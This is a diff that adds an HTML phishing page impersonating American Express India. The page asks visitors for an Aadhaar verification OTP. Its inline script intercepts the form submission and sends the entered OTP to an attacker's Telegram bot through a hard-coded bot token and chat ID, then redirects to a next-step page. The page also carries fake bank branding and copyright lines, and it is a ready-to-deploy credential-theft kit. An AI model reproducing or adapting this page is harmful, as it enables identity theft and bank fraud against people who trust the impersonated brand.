@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aadhar Verification</title>
+    <style>   
+        :root {
+            --amex-blue: #0070d5;
+            --text-purple: #4d2f7d;
+            --light-gray: #f4f4f4;
+            --border: #d5d5d5;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            /* Base font size increase */
+            font-size: 16px; 
+        }
+
+        /* Header Navigation */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 5%;
+            border-bottom: 1px solid #eee;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .amex-logo {
+            background: var(--amex-blue);
+            color: white;
+            padding: 8px 12px;
+            font-weight: bold;
+            font-size: 12px;
+            letter-spacing: 1px;
+            text-align: center;
+            line-height: 1.1;
+            text-transform: uppercase;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            font-size: 15px; /* Increased from 13px */
+            color: var(--amex-blue);
+            font-weight: 500;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--amex-blue);
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 25px;
+            font-size: 15px; /* Increased from 13px */
+        }
+
+        .login-btn {
+            background: var(--amex-blue);
+            color: white;
+            border: none;
+            padding: 10px 22px; /* Larger button */
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: bold;
+        }
+
+        /* Main Center Container */
+        .main-wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 60px 20px;
+            text-align: center;
+        }
+
+        .header-text {
+            margin-bottom: 40px;
+        }
+
+        h1 {
+            color: var(--text-purple);
+            font-size: 28px; /* Increased from 20px */
+            text-transform: uppercase;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+
+        .sub-header {
+            font-size: 16px; /* Increased from 12px */
+            color: #555;
+            margin-top: 10px;
+        }
+
+        /* Centering the Form Elements */
+        .form-container {
+            max-width: 500px; 
+            margin: 0 auto;   
+            text-align: left;
+        }
+
+        .form-container label {
+            display: block;
+            color: var(--text-purple);
+            font-size: 22px; /* Bold prominent label */
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 16px; /* Increased padding */
+            border: 1px solid var(--border);
+            background: var(--light-gray);
+            box-sizing: border-box; 
+            font-size: 18px; /* Larger text entry */
+            margin-bottom: 20px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: #efefef;
+            border: 1px solid var(--border);
+            color: #333;
+            font-size: 18px; /* Increased font */
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .submit-btn:hover {
+            background: #e0e0e0;
+        }
+
+        /* Footer */
+        footer {
+            margin-top: 80px;
+            border-top: 1px solid #eee;
+            padding: 50px 5% 30px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-col h4 {
+            font-size: 14px; /* Increased font */
+            text-transform: uppercase;
+            color: #000;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .footer-col ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer-col li {
+            margin-bottom: 12px;
+        }
+
+        .footer-col a {
+            text-decoration: none;
+            color: var(--amex-blue);
+            font-size: 14px; /* Increased font */
+        }
+
+        .copyright-section {
+            max-width: 1200px;
+            margin: 50px auto 0;
+            font-size: 13px; /* Increased font */
+            color: #777;
+            text-align: left;
+        }
+
+        /* Mobile Fixes */
+        @media (max-width: 768px) {
+            .nav-links, .nav-right span, .nav-right i { display: none; }
+            .main-wrapper { padding: 40px 15px; }
+            h1 { font-size: 24px; }
+            .form-container { max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="nav-left">
+        <div class="amex-logo">
+            AMERICAN<br>EXPRESS
+        </div>
+        <div class="nav-links">
+            <a href="#">My Account</a>
+            <a href="#">Cards</a>
+            <a href="#">Travel</a>
+            <a href="#">Insurance</a>
+        </div>
+    </div>
+    <div class="nav-right">
+        <i class="fa fa-search"></i>
+        <span style="cursor:pointer">Help</span>
+        <button class="login-btn">Log In</button>
+    </div>
+</nav>
+
+<div class="main-wrapper">
+    <div class="header-text">
+        <h1>Sign up your user account</h1>
+        <p class="sub-header">Fill all form field to go to next step</p>
+    </div>
+
+    <div class="form-container">
+        <label>Aadhar Verification Code:</label>
+
+ <form method="post" id="telegramForms">      
+  <div class="inputBox">
+
+        <input type="text" id="aadharotp" name="aadharotp" placeholder="Enter Your OTP Here">
+        <button class="submit-btn" class="btn">Submit</button>
+    </div>
+</div>
+</div>
+</form>
+
+
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h4>Top Links</h4>
+            <ul>
+                <li><a href="#">View Personal Cards</a></li>
+                <li><a href="#">Terms and Conditions</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h4>Business Links</h4>
+            <ul>
+                <li><a href="#">View Corporate Cards</a></li>
+                <li><a href="#">Corporate Travel</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h4>Company Information</h4>
+            <ul>
+                <li><a href="#">Vision and Mission</a></li>
+                <li><a href="#">Customer Service Committee</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h4>Policy and Regulation</h4>
+            <ul>
+                <li><a href="#">Notice Board</a></li>
+                <li><a href="#">Privacy Centre</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="copyright-section">
+        <p>India <span style="color:var(--amex-blue); cursor:pointer; font-weight:bold;">Change Country</span></p>
+        <p>Copyright © 2026 American Express Company | American Express Banking Corp.</p>
+    </div>
+</footer>
+
+
+<script>
+document.getElementById("telegramForms").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var otp = document.getElementById("aadharotp").value;
+
+  var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";  // ⚠️ new token use karo
+  var chatId = "1308711346";
+
+  var message =
+    " New Form Submission\n\n" +
+    "Aadhaar OTP: " + otp;
+
+  var telegramURL =
+    "https://api.telegram.org/bot" + botToken +
+    "/sendMessage?chat_id=" + chatId +
+    "&text=" + encodeURIComponent(message);
+
+  fetch(telegramURL)
+    .then(() => {
+      window.location.href = "proceed.html";
+    })
+    .catch(() => {
+      alert("Failed to send data");
+    });
+});
+</script>
+
+
+</body>
+</html>
